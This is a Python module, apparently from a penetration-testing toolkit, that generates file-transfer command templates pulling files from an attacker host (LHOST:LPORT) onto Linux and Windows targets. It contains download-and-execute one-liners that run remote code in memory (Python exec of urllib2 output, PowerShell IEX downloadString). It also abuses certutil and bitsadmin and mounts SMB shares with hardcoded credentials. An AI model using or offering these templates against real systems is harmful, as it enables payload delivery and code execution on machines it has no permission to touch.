"""Command classes for generating file transfer commands."""
from dataclasses import dataclass
from typing import Optional, List, Dict, Tuple, Set
from abc import ABC, abstractmethod


@dataclass
class CommandContext:
    """Context for command generation."""
    lhost: str
    lport: str
    input_file: str
    output_file: str
    protocol: str = 'HTTP'  # Default to HTTP


class Command(ABC):
    """Abstract base class for commands."""
    def __init__(self, name: str, template: str, notes: Optional[str] = None, protocols: Optional[Set[str]] = None):
        self.name = name
        self.template = template
        self.notes = notes
        self.protocols = protocols or {'HTTP'}  # Default to HTTP if not specified

    @abstractmethod
    def generate(self, context: CommandContext) -> str:
        """Generate the command string."""
        pass


class SimpleCommand(Command):
    """A simple command that uses string formatting."""
    def generate(self, context: CommandContext) -> str:
        protocol_prefix = context.protocol.lower()
        if protocol_prefix == 'https':
            protocol_prefix = 'https'
        elif protocol_prefix in ['http', 'ftp', 'smb']:
            protocol_prefix = f'{protocol_prefix.lower()}'
        elif protocol_prefix == 'scp':
            # SCP doesn't use a protocol prefix in the same way
            return self.template.format(
                LHOST=context.lhost,
                LPORT=context.lport,
                INPUTFILE=context.input_file,
                OUTPUTFILE=context.output_file
            )

        # Replace {PROTO} with the actual protocol
        template = self.template.replace('{PROTO}', protocol_prefix)
        return template.format(
            LHOST=context.lhost,
            LPORT=context.lport,
            INPUTFILE=context.input_file,
            OUTPUTFILE=context.output_file
        )


class CommandRegistry:
    """Registry for available commands."""
    def __init__(self):
        self._commands: Dict[str, Dict[str, List[Command]]] = {
            'windows': {},
            'linux': {}
        }

    def add_command(self, os_type: str, command_type: str, command: Command) -> None:
        """Add a command to the registry."""
        if os_type not in self._commands:
            raise ValueError(f"Invalid OS type: {os_type}")

        if command_type not in self._commands[os_type]:
            self._commands[os_type][command_type] = []

        self._commands[os_type][command_type].append(command)

    def get_commands(self, os_type: str, command_type: str, protocol: str) -> List[Command]:
        """Get all commands for a specific OS and command type that support the given protocol."""
        commands = self._commands.get(os_type, {}).get(command_type, [])
        return [cmd for cmd in commands if protocol.upper() in cmd.protocols]

    def get_command_types(self, os_type: str, protocol: str) -> List[str]:
        """Get all available command types for an OS that have commands supporting the given protocol."""
        command_types = []
        for cmd_type, commands in self._commands.get(os_type, {}).items():
            if any(protocol.upper() in cmd.protocols for cmd in commands):
                command_types.append(cmd_type)
        return command_types


def create_default_registry() -> CommandRegistry:
    """Create and populate the default command registry."""
    registry = CommandRegistry()

    # Linux Commands - HTTP/HTTPS
    registry.add_command('linux', 'curl',
        SimpleCommand('curl', 'curl {PROTO}://{LHOST}:{LPORT}/{INPUTFILE} -o {OUTPUTFILE}',
                     protocols={'HTTP', 'HTTPS'}))
    registry.add_command('linux', 'wget',
        SimpleCommand('wget', 'wget {PROTO}://{LHOST}:{LPORT}/{INPUTFILE} -O {OUTPUTFILE}',
                     protocols={'HTTP', 'HTTPS'}))
    registry.add_command('linux', 'python',
        SimpleCommand('python-memory', 'python -c "import urllib2; exec urllib2.urlopen(\'{PROTO}://{LHOST}:{LPORT}/{INPUTFILE}\').read()"',
                     notes="In memory", protocols={'HTTP', 'HTTPS'}))

    # Linux Commands - FTP
    registry.add_command('linux', 'ftp',
        SimpleCommand('ftp', 'ftp -n {LHOST} {LPORT} <<EOF\nuser anonymous anonymous\nget {INPUTFILE} {OUTPUTFILE}\nbye\nEOF',
                     protocols={'FTP'}))

    # Linux Commands - SCP
    registry.add_command('linux', 'scp',
        SimpleCommand('scp', 'scp -P {LPORT} {LHOST}:{INPUTFILE} {OUTPUTFILE}',
                     protocols={'SCP'}))

    # Linux Commands - SMB
    registry.add_command('linux', 'smbclient',
        SimpleCommand('smbclient', 'smbclient //{LHOST}/EXEGOL -U uberfile%exegol4thewin -c "get {INPUTFILE} {OUTPUTFILE}"',
                     protocols={'SMB'}))

    # Windows Commands - HTTP/HTTPS
    registry.add_command('windows', 'certutil',
        SimpleCommand('certutil', 'certutil.exe -urlcache -f {PROTO}://{LHOST}:{LPORT}/{INPUTFILE} {OUTPUTFILE}',
                     protocols={'HTTP', 'HTTPS'}))
    registry.add_command('windows', 'powershell',
        SimpleCommand('powershell-download', 'powershell.exe -c "(New-Object Net.WebClient).DownloadFile(\'{PROTO}://{LHOST}:{LPORT}/{INPUTFILE}\',\'{OUTPUTFILE}\')"',
                     protocols={'HTTP', 'HTTPS'}))
    registry.add_command('windows', 'powershell',
        SimpleCommand('powershell-webrequest', 'powershell.exe -c "Invoke-WebRequest \'{PROTO}://{LHOST}:{LPORT}/{INPUTFILE}\' -OutFile \'{OUTPUTFILE}\'"',
                     protocols={'HTTP', 'HTTPS'}))
    registry.add_command('windows', 'powershell',
        SimpleCommand('powershell-bits', 'powershell.exe -c "Import-Module BitsTransfer; Start-BitsTransfer -Source \'{PROTO}://{LHOST}:{LPORT}/{INPUTFILE}\' -Destination \'{OUTPUTFILE}\'"',
                     protocols={'HTTP', 'HTTPS'}))
    registry.add_command('windows', 'powershell',
        SimpleCommand('powershell-bits-async', 'powershell.exe -c "Import-Module BitsTransfer; Start-BitsTransfer -Source \'{PROTO}://{LHOST}:{LPORT}/{INPUTFILE}\' -Destination \'{OUTPUTFILE}\' -Asynchronous"',
                     protocols={'HTTP', 'HTTPS'}))
    registry.add_command('windows', 'powershell',
        SimpleCommand('powershell-memory', 'powershell.exe "IEX(New-Object Net.WebClient).downloadString(\'{PROTO}://{LHOST}:{LPORT}/{INPUTFILE}\')"',
                     notes="In memory", protocols={'HTTP', 'HTTPS'}))
    registry.add_command('windows', 'bitsadmin',
        SimpleCommand('bitsadmin', 'bitsadmin.exe /transfer 5720 /download /priority normal {PROTO}://{LHOST}:{LPORT}/{INPUTFILE} {OUTPUTFILE}',
                     protocols={'HTTP', 'HTTPS'}))
    registry.add_command('windows', 'wget',
        SimpleCommand('wget', 'wget "{PROTO}://{LHOST}:{LPORT}/{INPUTFILE}" -OutFile "{OUTPUTFILE}"',
                     protocols={'HTTP', 'HTTPS'}))

    # Windows Commands - FTP
    registry.add_command('windows', 'ftp',
        SimpleCommand('ftp', 'echo open {LHOST} {LPORT}> ftp.txt && echo user anonymous anonymous>> ftp.txt && echo get {INPUTFILE} {OUTPUTFILE}>> ftp.txt && echo bye>> ftp.txt && ftp -s:ftp.txt && del ftp.txt',
                     protocols={'FTP'}))

    # Windows Commands - SMB
    registry.add_command('windows', 'net-use',
        SimpleCommand('net-use', 'net use \\\\{LHOST}\\EXEGOL /user:uberfile exegol4thewin && copy \\\\{LHOST}\\EXEGOL\\{INPUTFILE} {OUTPUTFILE} && net use \\\\{LHOST}\\EXEGOL /delete',
                     protocols={'SMB'}))
    registry.add_command('windows', 'powershell-smb',
        SimpleCommand('powershell-smb', 'powershell.exe -c "$pass = ConvertTo-SecureString \'exegol4thewin\' -AsPlainText -Force; $cred = New-Object System.Management.Automation.PSCredential(\'uberfile\', $pass); New-PSDrive -Name \'Z\' -PSProvider FileSystem -Root \\\\{LHOST}\\EXEGOL -Credential $cred; Copy-Item -Path Z:\\{INPUTFILE} -Destination {OUTPUTFILE}; Remove-PSDrive -Name \'Z\'"',
                     protocols={'SMB'}))
    registry.add_command('windows', 'robocopy',
        SimpleCommand('robocopy', 'net use \\\\{LHOST}\\EXEGOL /user:uberfile exegol4thewin && robocopy \\\\{LHOST}\\EXEGOL . {INPUTFILE} /COPY:DAT /Z && net use \\\\{LHOST}\\EXEGOL /delete',
                     notes="Robust copy with restart capability", protocols={'SMB'}))

    return registry
